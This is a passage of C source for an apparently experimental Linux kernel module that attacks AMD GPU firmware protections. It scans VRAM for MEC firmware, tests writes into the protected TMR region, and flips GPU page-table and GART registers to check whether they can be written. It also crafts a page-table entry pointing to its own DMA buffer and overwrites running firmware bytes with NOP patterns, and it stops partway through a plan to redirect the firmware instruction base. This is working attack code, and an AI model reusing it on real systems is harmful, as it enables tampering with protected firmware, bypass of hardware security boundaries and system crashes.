				pr_info("fw36: VRAM[0x%llX] (TMR%+d page): "
					"%08X %08X %08X %08X | %08X %08X %08X %08X\n",
					off, i,
					buf[0], buf[1], buf[2], buf[3],
					buf[4], buf[5], buf[6], buf[7]);
			}
		}
	}

	/* 3) Scan VRAM at 4KB boundaries for firmware signature.
	 *    Strategy: scan last 256MB (near TMR), then first 256MB. */
	pr_info("fw36: Scanning VRAM for firmware sig %08X %08X...\n",
		fw_sig[0], fw_sig[1]);

	/* Last 256MB first (near TMR) */
	{
		u64 scan_start = (vram_size > 0x10000000ULL) ?
			vram_size - 0x10000000ULL : 0;
		pr_info("fw36: Scanning [0x%llX - 0x%llX]...\n",
			scan_start, vram_size);
		for (scan_off = scan_start; scan_off < vram_size && found < 5;
		     scan_off += 0x1000) {
			vram_access(adev, scan_off, buf, 16, false);
			if (buf[0] == fw_sig[0] && buf[1] == fw_sig[1]) {
				/* Verify with 3rd and 4th dword */
				if (buf[2] == fw_sig[2] && buf[3] == fw_sig[3]) {
					pr_info("fw36: *** FIRMWARE FOUND at VRAM+0x%llX! ***\n",
						scan_off);
					vram_access(adev, scan_off, buf, 64, false);
					pr_info("fw36:   [0x%llX] %08X %08X %08X %08X\n",
						scan_off, buf[0], buf[1], buf[2], buf[3]);
					pr_info("fw36:   [0x%llX] %08X %08X %08X %08X\n",
						scan_off+16, buf[4], buf[5], buf[6], buf[7]);
					found++;
				}
			}
			/* Also check for PSP container header (0x0006D3E0) */
			if (buf[0] == 0x0006D3E0) {
				pr_info("fw36: *** PSP HEADER at VRAM+0x%llX! ***\n",
					scan_off);
				found++;
			}
		}
	}

	/* First 64MB */
	if (!found) {
		pr_info("fw36: Scanning [0x0 - 0x4000000]...\n");
		for (scan_off = 0; scan_off < 0x4000000ULL && found < 5;
		     scan_off += 0x1000) {
			vram_access(adev, scan_off, buf, 16, false);
			if (buf[0] == fw_sig[0] && buf[1] == fw_sig[1] &&
			    buf[2] == fw_sig[2] && buf[3] == fw_sig[3]) {
				pr_info("fw36: *** FIRMWARE FOUND at VRAM+0x%llX! ***\n",
					scan_off);
				found++;
			}
			if (buf[0] == 0x0006D3E0) {
				pr_info("fw36: *** PSP HEADER at VRAM+0x%llX! ***\n",
					scan_off);
				found++;
			}
		}
	}

	/* 4) Try reading at IC_BASE as VRAM offset (even though it's too large) */
	if (ic_base < vram_size) {
		vram_access(adev, ic_base, buf, 64, false);
		pr_info("fw36: VRAM[IC_BASE=0x%llX]: %08X %08X %08X %08X\n",
			ic_base, buf[0], buf[1], buf[2], buf[3]);
	} else {
		pr_info("fw36: IC_BASE 0x%llX > VRAM size 0x%llX — not raw VRAM offset\n",
			ic_base, vram_size);
	}

	/* 5) Scan ALL of VRAM in 1MB steps (coarse, covers 6GB quickly) */
	if (!found) {
		pr_info("fw36: Coarse scan (1MB steps) entire VRAM...\n");
		for (scan_off = 0; scan_off < vram_size && found < 5;
		     scan_off += 0x100000ULL) {
			vram_access(adev, scan_off, buf, 16, false);
			if (buf[0] == fw_sig[0] && buf[1] == fw_sig[1]) {
				pr_info("fw36: *** POSSIBLE MATCH at VRAM+0x%llX! ***\n",
					scan_off);
				found++;
			}
		}
	}

	if (!found)
		pr_info("fw36: Firmware NOT found in VRAM — likely in TMR (encrypted)\n");

	pr_info("fw36: Scan complete. Found %d matches.\n", found);
}

/* Mode 12: TMR write test + PT_BASE redirect attack */
static void pt_redirect_attack(void *psp, void *adev)
{
	fn_vram_access vram_access;
	unsigned long va_addr;
	u32 gc_base0;
	u64 ic_base, fb_base, tmr_mc, tmr_voff;
	u32 buf[16], verify[16];
	u64 old_ptbase, old_gart_start, old_gart_end, old_ctx_cntl;
	int i;

	pr_info("fw36: === MODE 12: PT_BASE REDIRECT + TMR WRITE ===\n");

	va_addr = klookup("amdgpu_device_vram_access");
	if (!va_addr) { pr_info("fw36: vram_access not found\n"); return; }
	vram_access = (fn_vram_access)va_addr;

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) return;

	#define GC0(r) (gc_base0 + (r))
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	tmr_mc = 0x97E0000000ULL;
	tmr_voff = tmr_mc - fb_base;

	old_ptbase    = ((u64)rr(GC0(0x16a9)) << 32) | rr(GC0(0x16a8));
	old_gart_start = ((u64)rr(GC0(0x16b0)) << 32) | rr(GC0(0x16af));
	old_gart_end   = ((u64)rr(GC0(0x16d0)) << 32) | rr(GC0(0x16cf));
	old_ctx_cntl  = rr(GC0(0x16a7));

	pr_info("fw36: IC_BASE=0x%llX TMR_VOFF=0x%llX\n", ic_base, tmr_voff);
	pr_info("fw36: PT_BASE=0x%llX GART=[0x%llX-0x%llX] CTX0=0x%llX\n",
		old_ptbase, old_gart_start, old_gart_end, old_ctx_cntl);

	/* === TEST 1: TMR Write via vram_access === */
	pr_info("fw36: === TEST 1: TMR WRITE TEST ===\n");
	{
		/* Read current TMR content */
		u64 test_off = tmr_voff + 0x10000; /* 64KB into TMR */
		vram_access(adev, test_off, buf, 64, false);
		pr_info("fw36: TMR[+0x10000] before: %08X %08X %08X %08X\n",
			buf[0], buf[1], buf[2], buf[3]);

		/* Try writing a known pattern */
		for (i = 0; i < 16; i++) buf[i] = 0xDEAD0000 + i;
		vram_access(adev, test_off, buf, 64, true);

		/* Read back */
		memset(verify, 0, 64);
		vram_access(adev, test_off, verify, 64, false);
		pr_info("fw36: TMR[+0x10000] after:  %08X %08X %08X %08X\n",
			verify[0], verify[1], verify[2], verify[3]);

		if (verify[0] == 0xDEAD0000)
			pr_info("fw36: *** TMR WRITE SUCCESS! TMR is CPU-writable! ***\n");
		else
			pr_info("fw36: TMR write failed (read back different from written)\n");

		/* Try writing to VRAM JUST BEFORE TMR (should work) */
		test_off = tmr_voff - 0x1000; /* 1 page before TMR */
		vram_access(adev, test_off, buf, 64, false);
		pr_info("fw36: pre-TMR before: %08X %08X %08X %08X\n",
			buf[0], buf[1], buf[2], buf[3]);
		for (i = 0; i < 16; i++) buf[i] = 0xBEEF0000 + i;
		vram_access(adev, test_off, buf, 64, true);
		vram_access(adev, test_off, verify, 64, false);
		pr_info("fw36: pre-TMR after:  %08X %08X %08X %08X\n",
			verify[0], verify[1], verify[2], verify[3]);
		if (verify[0] == 0xBEEF0000)
			pr_info("fw36: Pre-TMR VRAM write works (expected)\n");
	}

	/* === TEST 2: GART register writability === */
	pr_info("fw36: === TEST 2: GART REGISTER WRITABILITY ===\n");
	{
		u32 start_lo, start_hi, end_lo, end_hi;

		/* Try writing a different value to GART_START_LO */
		start_lo = rr(GC0(0x16af));
		wr(GC0(0x16af), start_lo ^ 0x1000);
		pr_info("fw36: GART_START_LO: 0x%08X → 0x%08X %s\n",
			start_lo, rr(GC0(0x16af)),
			(rr(GC0(0x16af)) == (start_lo ^ 0x1000)) ? "WRITABLE!" : "locked");
		wr(GC0(0x16af), start_lo); /* restore */

		/* GART_END_LO */
		end_lo = rr(GC0(0x16cf));
		wr(GC0(0x16cf), end_lo ^ 0x1000);
		pr_info("fw36: GART_END_LO:   0x%08X → 0x%08X %s\n",
			end_lo, rr(GC0(0x16cf)),
			(rr(GC0(0x16cf)) == (end_lo ^ 0x1000)) ? "WRITABLE!" : "locked");
		wr(GC0(0x16cf), end_lo); /* restore */
	}

	/* === TEST 3: CTX0_CNTL depth change === */
	pr_info("fw36: === TEST 3: PAGE TABLE DEPTH CHANGE ===\n");
	{
		u32 ctx = rr(GC0(0x16a7));
		u32 new_ctx = (ctx & ~0x6) | 0x2; /* depth=0 → depth=1 */
		pr_info("fw36: CTX0_CNTL: 0x%08X (depth=%d)\n", ctx, (ctx >> 1) & 0x3);
		wr(GC0(0x16a7), new_ctx);
		pr_info("fw36: After depth=1 write: 0x%08X (depth=%d) %s\n",
			rr(GC0(0x16a7)), (rr(GC0(0x16a7)) >> 1) & 0x3,
			(rr(GC0(0x16a7)) == new_ctx) ? "WRITABLE!" : "locked");
		wr(GC0(0x16a7), ctx); /* restore immediately */
		pr_info("fw36: Restored: 0x%08X\n", rr(GC0(0x16a7)));
	}

	/* === TEST 4: PT_BASE writability with custom value === */
	pr_info("fw36: === TEST 4: PT_BASE REDIRECT TEST ===\n");
	{
		u32 lo = rr(GC0(0x16a8));
		u32 hi = rr(GC0(0x16a9));
		u32 test_lo = lo ^ 0x100; /* flip a benign bit */
		pr_info("fw36: PT_BASE: HI=0x%08X LO=0x%08X\n", hi, lo);

		wr(GC0(0x16a8), test_lo);
		pr_info("fw36: PT_BASE_LO: wrote 0x%08X read 0x%08X %s\n",
			test_lo, rr(GC0(0x16a8)),
			(rr(GC0(0x16a8)) == test_lo) ? "WRITABLE!" : "locked");
		wr(GC0(0x16a8), lo); /* restore */

		/* Try HI */
		wr(GC0(0x16a9), hi ^ 0x1);
		pr_info("fw36: PT_BASE_HI: wrote 0x%08X read 0x%08X %s\n",
			hi ^ 0x1, rr(GC0(0x16a9)),
			(rr(GC0(0x16a9)) == (hi ^ 0x1)) ? "WRITABLE!" : "locked");
		wr(GC0(0x16a9), hi); /* restore */
	}

	/* === TEST 5: Allocate DMA buffer and try to map via GART PTE === */
	pr_info("fw36: === TEST 5: DMA FIRMWARE BUFFER + GART PTE ===\n");
	{
		void *dma_buf;
		dma_addr_t dma_addr;
		u64 gart_table_kptr = 0;
		int off;

		/* Allocate 4KB DMA buffer for firmware test page */
		dma_buf = dma_alloc_coherent(&g_pdev->dev, 4096, &dma_addr, GFP_KERNEL);
		if (!dma_buf) {
			pr_info("fw36: DMA alloc failed\n");
			goto skip_test5;
		}
		pr_info("fw36: DMA buffer: kaddr=%p dma=0x%llX\n",
			dma_buf, (u64)dma_addr);

		/* Fill with NOP-like RS64 instructions (RISC-V NOP = 0x00000013) */
		for (i = 0; i < 1024; i++)
			((u32 *)dma_buf)[i] = 0x00000013; /* NOP */
		/* Put a jump-to-self at start as a safe test instruction */
		((u32 *)dma_buf)[0] = 0x0000006F; /* JAL x0, 0 (infinite loop) */

		/* Find GART table kptr from adev */
		for (off = 0x2F000; off < 0x3C000; off += 8) {
			u64 v = *(u64 *)((u8 *)adev + off);
			if ((v >> 48) == 0xFFFF && v != 0xFFFFFFFFFFFFFFFFULL) {
				u64 next = *(u64 *)((u8 *)adev + off + 8);
				if (next == 0x1010000) { /* GART table size */
					gart_table_kptr = v;
					pr_info("fw36: GART table kptr=0x%llX at adev+0x%X\n",
						v, off);
					break;
				}
			}
		}

		if (gart_table_kptr) {
			/* Write a PTE near the start of the GART table
			 * PTE format: phys_addr | flags (bit 0 = valid)
			 * We'll use PTE index 0 (GART VA = GART_START + 0) */
			u64 *pte_ptr = (u64 *)(unsigned long)gart_table_kptr;
			u64 old_pte, new_pte;
			u64 pte_phys;

			/* Read existing PTE[0] */
			if (copy_from_kernel_nofault(&old_pte, pte_ptr, 8) == 0) {
				pr_info("fw36: PTE[0] = 0x%016llX\n", old_pte);

				/* Create new PTE pointing to our DMA buffer.
				 * PTE format on GFX12: [47:12] = phys page, [0] = valid
				 * DMA address IS the MC physical address the GPU sees */
				pte_phys = (u64)dma_addr;
				new_pte = (pte_phys & 0xFFFFFFFFF000ULL) | 0x7; /* valid + readable + writable */

				pr_info("fw36: New PTE = 0x%016llX (phys=0x%llX)\n",
					new_pte, pte_phys);
				pr_info("fw36: This would map GART VA 0x%llX000 → DMA buf\n",
					old_gart_start);

				/* DON'T actually write the PTE yet — just report.
				 * Writing without TLB flush could crash. */
				pr_info("fw36: PTE write + IC_BASE redirect READY.\n");
				pr_info("fw36: To complete: write PTE, flush TLB, "
					"change IC_BASE (if possible)\n");
			}
		}

		/* Don't free the DMA buffer — keep it around for later use */
		fw_dma_buf = dma_buf;
		fw_dma_size = 4096;
		fw_dma_addr = dma_addr;
		pr_info("fw36: DMA buffer kept at dma_addr=0x%llX\n",
			(u64)fw_dma_addr);
skip_test5:
		;
	}

	#undef GC0
}

/* Mode 13: Full PT redirect — read IC_BASE PTE, overwrite firmware in VRAM */
static void pt_redirect_execute(void *psp, void *adev)
{
	fn_vram_access vram_access;
	unsigned long va_addr;
	u32 gc_base0;
	u64 ic_base, fb_base, fb_top;
	u64 pt_base, gart_start, gart_end;
	u32 ctx0_cntl;
	u64 gart_kptr = 0;
	u64 ic_page, gs_page, rel_page;
	u64 fw_mc_phys, fw_vram_off = 0;
	int fw_vram_valid = 0;
	int off, i;

	pr_info("fw36: === MODE 13: PT_REDIRECT_EXECUTE ===\n");

	/* Resolve vram_access */
	va_addr = klookup("amdgpu_device_vram_access");
	if (!va_addr) { pr_info("fw36: vram_access not found\n"); return; }
	vram_access = (fn_vram_access)va_addr;

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }
	pr_info("fw36: gc_base0 = 0x%X\n", gc_base0);

	#define GC0(r) (gc_base0 + (r))

	/* ========================================
	 * STEP 1: Read CORRECT VMID0 registers
	 * Mode 9 registers (0x168f/0x1690, 0x1624) are VMID 0.
	 * Mode 12 was testing WRONG registers (0x16a8/0x16a9 = different VMID).
	 * ======================================== */
	pt_base    = ((u64)rr(GC0(0x1690)) << 32) | rr(GC0(0x168f));
	gart_start = ((u64)rr(GC0(0x16b0)) << 32) | rr(GC0(0x16af));
	gart_end   = ((u64)rr(GC0(0x16d0)) << 32) | rr(GC0(0x16cf));
	ctx0_cntl  = rr(GC0(0x1624));
	fb_base    = (u64)rr(GC0(0x1614)) << 24;
	fb_top     = (u64)rr(GC0(0x1615)) << 24;
	ic_base    = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);

	pr_info("fw36: IC_BASE     = 0x%016llX\n", ic_base);
	pr_info("fw36: PT_BASE     = 0x%016llX (Valid=%llu)\n", pt_base, pt_base & 1);
	pr_info("fw36: CTX0_CNTL   = 0x%08X (depth=%u en=%u)\n",
		ctx0_cntl, (ctx0_cntl >> 1) & 0x7, ctx0_cntl & 1);
	pr_info("fw36: GART        = [0x%llX - 0x%llX] (VA [0x%llX - 0x%llX])\n",
		gart_start, gart_end, gart_start << 12, gart_end << 12);
	pr_info("fw36: FB           = [0x%llX - 0x%llX]\n", fb_base, fb_top);
	pr_info("fw36: MEC PC       = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

	/* Cross-check using adev_rreg if available */
	if (adev_rreg) {
		u64 pt2 = ((u64)adev_rreg(adev, GC0(0x1690), 0) << 32) |
			   adev_rreg(adev, GC0(0x168f), 0);
		u32 ctx2 = adev_rreg(adev, GC0(0x1624), 0);
		pr_info("fw36: adev_rreg cross-check: PT_BASE=0x%016llX CTX0=0x%08X\n",
			pt2, ctx2);
		if (pt2 != pt_base)
			pr_info("fw36: *** PT_BASE MISMATCH: rr=0x%llX adev=0x%llX ***\n",
				pt_base, pt2);
	}

	/* Also read mode 12's wrong registers for comparison */
	{
		u64 wrong_pt = ((u64)rr(GC0(0x16a9)) << 32) | rr(GC0(0x16a8));
		u32 wrong_ctx = rr(GC0(0x16a7));
		pr_info("fw36: Mode12 regs (wrong VMID): PT=0x%llX CTX=0x%08X\n",
			wrong_pt, wrong_ctx);
	}

	if (!(pt_base & 1)) {
		pr_info("fw36: PT_BASE not valid! Cannot proceed.\n");
		goto done;
	}

	/* ========================================
	 * STEP 2: Find GART table kernel pointer
	 * Same scan as mode 9: look for kptr with table_size nearby
	 * ======================================== */
	for (off = 0x100; off < 0x200000; off += 8) {
		u64 val;
		u32 prev32;
		if (copy_from_kernel_nofault(&val, (u8 *)adev + off, 8) != 0)
			continue;
		if ((val >> 48) == 0xFFFF && val != 0xFFFFFFFFFFFFFFFFULL) {
			if (copy_from_kernel_nofault(&prev32, (u8 *)adev + off - 4, 4) != 0)
				continue;
			if (prev32 >= 0x80000 && prev32 <= 0x4000000 &&
			    (prev32 & 0xFFF) == 0) {
				pr_info("fw36: GART table: ptr=0x%llX size=0x%X at adev+0x%X\n",
					val, prev32, off);
				if (!gart_kptr)
					gart_kptr = val;
			}
		}
	}

	if (!gart_kptr) {
		pr_info("fw36: GART kernel pointer not found!\n");
		goto done;
	}

	/* ========================================
	 * STEP 3: Read PTE for IC_BASE
	 * ======================================== */
	gs_page = gart_start;  /* already in page units */
	ic_page = ic_base >> 12;
	rel_page = ic_page - gs_page;
	pr_info("fw36: ic_page=0x%llX gs_page=0x%llX rel_page=0x%llX (PTE off=0x%llX)\n",
		ic_page, gs_page, rel_page, rel_page * 8);

	if (rel_page * 8 > 0x4000000ULL) {
		pr_info("fw36: IC_BASE not in GART range — using GPUVM page table walk\n");
	}

	/* ========================================
	 * STEP 3b: Find firmware via multiple strategies
	 * IC_BASE=0x20681D4000 is NOT in GART and NOT in FB.
	 * It's in system memory, likely accessed via system aperture
	 * (identity MC→phys mapping) or ATC/IOMMU.
	 * ======================================== */
	{
		u64 mec_fw_kptr = 0;
		u64 sys_lo, sys_hi;

		pr_info("fw36: === FIRMWARE LOCATION ANALYSIS ===\n");

		/* Read system aperture */
		sys_lo = (u64)rr(GC0(0x1619)) << 18;
		sys_hi = (u64)rr(GC0(0x161a)) << 18;
		pr_info("fw36: SYS_APERTURE = [0x%llX - 0x%llX]\n", sys_lo, sys_hi);

		if (ic_base >= sys_lo && ic_base < sys_hi)
			pr_info("fw36: IC_BASE IS within system aperture (identity-mapped)!\n");
		else
			pr_info("fw36: IC_BASE NOT in system aperture\n");

		/* Strategy 1: Follow pointer chains from adev.
		 * Scan adev for pointers to sub-structures that contain IC_BASE */
		pr_info("fw36: === DEEP POINTER SCAN ===\n");
		{
			int found = 0;
			for (off = 8; off < 0x200000 && found < 5; off += 8) {
				u64 ptr;
				if (copy_from_kernel_nofault(&ptr, (u8 *)adev + off, 8) != 0)
					continue;
				/* Look for kernel pointers that might be sub-structures */
				if ((ptr >> 48) == 0xFFFF && ptr != 0xFFFFFFFFFFFFFFFFULL) {
					/* Read 256 bytes at this pointer, look for IC_BASE */
					u64 subvals[32];
					int j;
					if (copy_from_kernel_nofault(subvals, (void *)(unsigned long)ptr, 256) != 0)
						continue;
					for (j = 0; j < 32; j++) {
						if (subvals[j] == ic_base) {
							pr_info("fw36: IC_BASE found at adev+0x%X→[+0x%X]\n",
								off, j * 8);
							/* Check nearby for kptr */
							if (j > 0 && (subvals[j-1] >> 48) == 0xFFFF) {
								mec_fw_kptr = subvals[j-1];
								pr_info("fw36: *** FW KPTR = 0x%llX (at [-8]) ***\n",
									mec_fw_kptr);
							}
							if (j < 31 && (subvals[j+1] >> 48) == 0xFFFF) {
								mec_fw_kptr = subvals[j+1];
								pr_info("fw36: *** FW KPTR = 0x%llX (at [+8]) ***\n",
									mec_fw_kptr);
							}
							/* Also dump surrounding context */
							{
								int k;
								for (k = (j > 4 ? j-4 : 0); k < (j < 28 ? j+4 : 32); k++)
									pr_info("fw36:   [+0x%X] = 0x%016llX\n",
										k * 8, subvals[k]);
							}
							found++;
						}
						/* Also check for IC_BASE - 0x2000 (BO start if code at +0x2000) */
						if (subvals[j] == (ic_base - 0x2000)) {
							pr_info("fw36: IC_BASE-0x2000 at adev+0x%X→[+0x%X]\n",
								off, j * 8);
							if (j < 31 && (subvals[j+1] >> 48) == 0xFFFF) {
								pr_info("fw36: BO KPTR = 0x%llX\n", subvals[j+1]);
								if (!mec_fw_kptr)
									mec_fw_kptr = subvals[j+1];
							}
							found++;
						}
					}
				}
			}
			if (!found)
				pr_info("fw36: No IC_BASE in pointer chain scan\n");
		}

		/* Strategy 2: Scan ALL of adev at 4-byte alignment for IC_BASE */
		if (!mec_fw_kptr) {
			pr_info("fw36: === 4-BYTE ALIGNED SCAN (2MB) ===\n");
			for (off = 4; off < 0x200000; off += 4) {
				u64 val;
				if (copy_from_kernel_nofault(&val, (u8 *)adev + off, 8) != 0)
					continue;
				if (val == ic_base) {
					u64 prev, next;
					copy_from_kernel_nofault(&prev, (u8 *)adev + off - 8, 8);
					copy_from_kernel_nofault(&next, (u8 *)adev + off + 8, 8);
					pr_info("fw36: IC_BASE at adev+0x%X (4B): prev=0x%llX next=0x%llX\n",
						off, prev, next);
					if ((next >> 48) == 0xFFFF && !mec_fw_kptr)
						mec_fw_kptr = next;
					if ((prev >> 48) == 0xFFFF && !mec_fw_kptr)
						mec_fw_kptr = prev;
				}
			}
		}

		/* Strategy 3: Look up amdgpu_bo_create_kernel_at → find FW BO
		 * Search for gfx.mec structure by looking for known patterns:
		 * mec_fw_gpu_addr is likely near mec firmware size (0x6D3E0) */
		if (!mec_fw_kptr) {
			u32 fw_size = 0x6D3E0; /* known MEC firmware size */
			pr_info("fw36: === FW SIZE PATTERN SCAN (0x%X, 2MB range) ===\n", fw_size);
			for (off = 8; off < 0x200000; off += 4) {
				u32 val;
				if (copy_from_kernel_nofault(&val, (u8 *)adev + off, 4) != 0)
					continue;
				if (val == fw_size) {
					/* Dump context around firmware size */
					int k;
					pr_info("fw36: fw_size match at adev+0x%X:\n", off);
					for (k = -8; k <= 8; k++) {
						u64 v;
						if (copy_from_kernel_nofault(&v, (u8 *)adev + off + k * 8, 8) != 0)
							continue;
						pr_info("fw36:   [%+d] = 0x%016llX%s%s\n",
							k * 8, v,
							(v == ic_base) ? " <IC_BASE>" : "",
							((v >> 48) == 0xFFFF) ? " <KPTR>" : "");
					}
				}
			}
		}

		/* Strategy 4: If IC_BASE in system aperture, try ioremap */
		if (ic_base >= sys_lo && ic_base < sys_hi && !mec_fw_kptr) {
			void __iomem *fw_io;
			pr_info("fw36: === IOREMAP IC_BASE (system aperture) ===\n");

			/* IC_BASE in system aperture = MC phys = CPU phys (or IOMMU translated) */
			fw_io = ioremap(ic_base, 0x1000);
			if (fw_io) {
				u32 code[8];
				int k;
				for (k = 0; k < 8; k++)
					code[k] = readl(fw_io + k * 4);
				pr_info("fw36: ioremap(0x%llX): %08X %08X %08X %08X %08X %08X %08X %08X\n",
					ic_base, code[0], code[1], code[2], code[3],
					code[4], code[5], code[6], code[7]);
				iounmap(fw_io);
			} else {
				pr_info("fw36: ioremap failed\n");
			}
		}

		/* Strategy 5: Use DMA API to map IC_BASE as a DMA address */
		if (!mec_fw_kptr) {
			pr_info("fw36: === DMA ADDRESS PROBE ===\n");
			/* The page table at PT_BASE is in DMA memory.
			 * Try reading PT via phys_to_virt (works if DMA=phys, no IOMMU) */
			{
				u64 pt_phys = pt_base & ~0xFFFULL;
				void *pt_virt = phys_to_virt(pt_phys);
				u64 test_val;
				pr_info("fw36: PT_BASE phys=0x%llX → virt=%p\n", pt_phys, pt_virt);
				if (copy_from_kernel_nofault(&test_val, pt_virt, 8) == 0) {
					pr_info("fw36: PT[0] via phys_to_virt = 0x%016llX\n", test_val);
					/* If readable, dump PDB entries */
					{
						int k, nz = 0;
						for (k = 0; k < 4096 && nz < 30; k++) {
							u64 e;
							if (copy_from_kernel_nofault(&e,
								(u8 *)pt_virt + k * 8, 8) == 0 && e != 0) {
								pr_info("fw36: PT[%d] = 0x%016llX\n", k, e);
								nz++;
							}
						}
						pr_info("fw36: PT: %d non-zero entries in first 4096\n", nz);
					}
				} else {
					pr_info("fw36: PT phys_to_virt read FAULT (IOMMU active)\n");
				}
			}
		}

		if (mec_fw_kptr) {
			/* Validate the firmware kptr */
			u32 code[8];
			const u32 expected[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};
			pr_info("fw36: *** TESTING FW KPTR = 0x%llX ***\n", mec_fw_kptr);

			if (copy_from_kernel_nofault(code, (void *)(unsigned long)mec_fw_kptr, 32) == 0) {
				pr_info("fw36: Code: %08X %08X %08X %08X %08X %08X %08X %08X\n",
					code[0], code[1], code[2], code[3],
					code[4], code[5], code[6], code[7]);
				if (code[0] == expected[0] && code[1] == expected[1])
					pr_info("fw36: *** FIRMWARE CODE SIGNATURE MATCH! ***\n");
			} else {
				pr_info("fw36: FW kptr read FAULT\n");
			}
		}

		/* If IC_BASE is within FB range, compute VRAM offset */
		if (ic_base >= fb_base && ic_base < fb_top) {
			fw_vram_off = ic_base - fb_base;
			fw_vram_valid = 1;
			pr_info("fw36: IC_BASE in VRAM: offset 0x%llX\n", fw_vram_off);
		} else {
			pr_info("fw36: IC_BASE NOT in VRAM (0x%llX not in [0x%llX-0x%llX])\n",
				ic_base, fb_base, fb_top);
		}
	}

	/* ========================================
	 * STEP 4: Read firmware from VRAM (only if IC_BASE maps to VRAM)
	 * ======================================== */
	if (!fw_vram_valid) {
		pr_info("fw36: Skipping VRAM read — IC_BASE not in FB range\n");
		goto skip_vram_rw;
	}
	pr_info("fw36: === READING FIRMWARE FROM VRAM (offset 0x%llX) ===\n", fw_vram_off);
	{
		u32 fw_header[64]; /* 256 bytes */
		u32 fw_code[64];   /* 256 bytes at code offset */
		const u32 expected_code[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};

		/* Read first 256 bytes (header area) */
		vram_access(adev, fw_vram_off, fw_header, 256, false);
		pr_info("fw36: VRAM[+0x000]: %08X %08X %08X %08X\n",
			fw_header[0], fw_header[1], fw_header[2], fw_header[3]);
		pr_info("fw36: VRAM[+0x010]: %08X %08X %08X %08X\n",
			fw_header[4], fw_header[5], fw_header[6], fw_header[7]);

		/* RS64 code starts at offset 0x2000 from PSP header start,
		 * but IC_BASE may point directly to code (no header) */
		/* Try reading at offset 0 as code */
		if (fw_header[0] == expected_code[0] &&
		    fw_header[1] == expected_code[1]) {
			pr_info("fw36: *** FIRMWARE CODE FOUND AT IC_BASE! ***\n");
			pr_info("fw36: IC_BASE points directly to RS64 code (no PSP header)\n");
		}

		/* Also try at +0x2000 (PSP header offset) */
		vram_access(adev, fw_vram_off + 0x2000, fw_code, 256, false);
		pr_info("fw36: VRAM[+0x2000]: %08X %08X %08X %08X\n",
			fw_code[0], fw_code[1], fw_code[2], fw_code[3]);
		if (fw_code[0] == expected_code[0] &&
		    fw_code[1] == expected_code[1]) {
			pr_info("fw36: *** FIRMWARE CODE at +0x2000 (PSP header present) ***\n");
		}

		/* Read more pages to understand layout */
		for (i = 0; i < 8; i++) {
			u32 pg[4];
			vram_access(adev, fw_vram_off + i * 0x1000, pg, 16, false);
			if (pg[0] != 0 || pg[1] != 0)
				pr_info("fw36: VRAM[+0x%X000]: %08X %08X %08X %08X\n",
					i, pg[0], pg[1], pg[2], pg[3]);
		}
	}

	/* ========================================
	 * STEP 5: Write test pattern to firmware VRAM location
	 * This tests if we can modify the running firmware.
	 * We write a single NOP at a safe offset (not the entry point).
	 * ======================================== */
	pr_info("fw36: === FIRMWARE WRITE TEST (safe offset) ===\n");
	{
		u32 test_off_pages = 4; /* 0x4000 into firmware = well past entry */
		u64 test_voff = fw_vram_off + test_off_pages * 0x1000;
		u32 orig[4], written[4], verify[4];

		/* Read original */
		vram_access(adev, test_voff, orig, 16, false);
		pr_info("fw36: FW[+0x%X000] orig: %08X %08X %08X %08X\n",
			test_off_pages, orig[0], orig[1], orig[2], orig[3]);

		/* Write test pattern */
		written[0] = 0x00000013; /* NOP */
		written[1] = 0x00000013;
		written[2] = 0x00000013;
		written[3] = 0xCAFE0013; /* tagged NOP */
		vram_access(adev, test_voff, written, 16, true);

		/* Read back */
		vram_access(adev, test_voff, verify, 16, false);
		pr_info("fw36: FW[+0x%X000] verify: %08X %08X %08X %08X\n",
			test_off_pages, verify[0], verify[1], verify[2], verify[3]);

		if (verify[3] == 0xCAFE0013) {
			pr_info("fw36: *** FIRMWARE VRAM WRITE SUCCESS! ***\n");
			pr_info("fw36: We can modify running MEC firmware in VRAM!\n");
			/* Restore original */
			vram_access(adev, test_voff, orig, 16, true);
			pr_info("fw36: Restored original firmware bytes\n");
		} else {
			pr_info("fw36: FW write failed or data not visible\n");
		}
	}

skip_vram_rw:
	/* ========================================
	 * STEP 6: Test VMID0 PT_BASE writability
	 * (Mode 12 tested wrong registers!)
	 * ======================================== */
	pr_info("fw36: === VMID0 REGISTER WRITABILITY ===\n");
	{
		u32 lo = rr(GC0(0x168f));
		u32 hi = rr(GC0(0x1690));
		u32 ctx = rr(GC0(0x1624));

		/* Test PT_BASE_LO writability */
		wr(GC0(0x168f), lo ^ 0x100);
		pr_info("fw36: PT_BASE_LO (0x168f): 0x%08X → 0x%08X %s\n",
			lo, rr(GC0(0x168f)),
			(rr(GC0(0x168f)) == (lo ^ 0x100)) ? "WRITABLE!" : "LOCKED");
		wr(GC0(0x168f), lo); /* restore */

		/* Test PT_BASE_HI */
		wr(GC0(0x1690), hi ^ 0x1);
		pr_info("fw36: PT_BASE_HI (0x1690): 0x%08X → 0x%08X %s\n",
			hi, rr(GC0(0x1690)),
			(rr(GC0(0x1690)) == (hi ^ 0x1)) ? "WRITABLE!" : "LOCKED");
		wr(GC0(0x1690), hi); /* restore */

		/* Test CTX0_CNTL depth change */
		{
			u32 new_ctx = (ctx & ~0x6) | 0x4; /* try depth=2 */
			wr(GC0(0x1624), new_ctx);
			pr_info("fw36: CTX0_CNTL (0x1624): 0x%08X → 0x%08X (depth=%u) %s\n",
				ctx, rr(GC0(0x1624)),
				(rr(GC0(0x1624)) >> 1) & 0x7,
				(rr(GC0(0x1624)) == new_ctx) ? "WRITABLE!" : "LOCKED");
			wr(GC0(0x1624), ctx); /* restore */
		}
	}

	/* ========================================
	 * STEP 7: Build replacement page table + redirect IC_BASE
	 *
	 * IC_BASE=0x20681D4000 is NOT in GART or FB or system aperture.
	 * With depth=0, the page table is a flat PTE array:
	 *   PT_BASE[VA>>12] → physical page.
	 *
	 * Strategy: Build a NEW page table that maps IC_BASE pages
	 * to our DMA firmware buffer, and repoint PT_BASE.
	 *
	 * But depth=0 with a SINGLE PDB entry means the entire address
	 * space is one flat page table. IC_BASE>>12 = 0x20681D4 = entry
